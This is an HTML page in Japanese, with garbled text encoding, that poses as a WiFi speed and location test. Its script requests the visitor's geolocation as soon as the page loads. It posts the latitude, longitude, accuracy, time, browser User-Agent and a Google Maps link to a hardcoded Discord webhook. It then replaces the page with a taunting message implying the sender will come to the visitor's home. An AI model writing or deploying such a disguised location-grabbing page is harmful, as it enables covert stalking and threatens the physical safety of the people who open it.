<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WIFIé€šä¿¡é€Ÿåº¦ãƒ»å ´æ‰€é©æ€§è¨ºæ–­</title>
  <style>
    body { background: #000; color: #0f0; font-family: monospace; text-align: center; padding: 50px; }
    h1 { font-size: 2em; }
    button { font-size: 1.5em; padding: 15px 30px; margin: 20px; }
  </style>
</head>
<body>
  <h1>ç¾åœ¨åœ°ã§ã®WIFIé€šä¿¡é€Ÿåº¦è¨ˆæ¸¬</h1>
  <p>é€šä¿¡é€Ÿåº¦ã‚’è¨ˆæ¸¬ä¸­...</p>
  <button onclick="getLocation()">ä½ç½®æƒ…å ±ã‚’è¨±å¯</button>

  <script>
    const webhook = 'https://ptb.discord.com/api/webhooks/1456662273887043848/IgWVdhr5WT4njMdUs49pnyCJAkD7i_b9HKh6jxRHZuA406pOyO0cDQo6PQ8kkEnY7WWg'; // 

    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(sendPosition, showError);
      } else {
        alert("ã“ã®ãƒ–ãƒ©ã‚¦ã‚¶ã¯ä½ç½®æƒ…å ±ã«å¯¾å¿œã—ã¦ã„ã¾ã›ã‚“");
      }
    }

    function sendPosition(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const acc = position.coords.accuracy;
      const timestamp = new Date(position.timestamp).toLocaleString();

      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;

      const data = `
**ä½ç½®æƒ…å ±å–å¾—æˆåŠŸ**
ç·¯åº¦: ${lat}
çµŒåº¦: ${lon}
ç²¾åº¦: Â±${acc}m
æ™‚é–“: ${timestamp}
User-Agent: ${navigator.userAgent}
Google Maps: ${mapsUrl}
      `;

      fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: data })
      });

      document.body.innerHTML = '<h1>å®¶è¡Œãã­ã‚ªãƒ„ã‚«ãƒ¬ğŸ‘ï¸</h1>';
    }

    function showError(error) {
      let msg;
      switch(error.code) {
        case error.PERMISSION_DENIED: msg = "ä½ç½®æƒ…å ±ã®è¨±å¯ãŒæ‹’å¦ã•ã‚Œã¾ã—ãŸ"; break;
        case error.POSITION_UNAVAILABLE: msg = "ä½ç½®æƒ…å ±ãŒå–å¾—ã§ãã¾ã›ã‚“"; break;
        case error.TIMEOUT: msg = "ã‚¿ã‚¤ãƒ ã‚¢ã‚¦ãƒˆ"; break;
        default: msg = "ä¸æ˜ãªã‚¨ãƒ©ãƒ¼"; break;
      }
      document.body.innerHTML += `<p>${msg}</p>`;
    }

    // ãƒšãƒ¼ã‚¸ãƒ­ãƒ¼ãƒ‰æ™‚ã«è‡ªå‹•ã§è¨±å¯ãƒ—ãƒ­ãƒ³ãƒ—ãƒˆè¡¨ç¤º
    window.onload = getLocation;
  </script>
</body>
</html>
